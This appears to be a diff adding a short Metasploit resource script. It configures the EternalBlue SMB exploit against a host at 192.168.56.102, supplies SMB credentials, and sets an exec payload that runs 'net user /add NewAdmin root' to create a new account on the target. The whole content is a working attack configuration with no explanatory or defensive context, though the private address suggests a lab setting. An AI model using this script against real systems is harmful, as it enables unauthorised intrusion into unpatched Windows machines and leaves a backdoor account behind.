@@ -1,0 +1,6 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set rhosts 192.168.56.102
+set SMBUser Test
+set SMBPass password
+set payload windows/x64/exec
+set cmd net user /add NewAdmin root
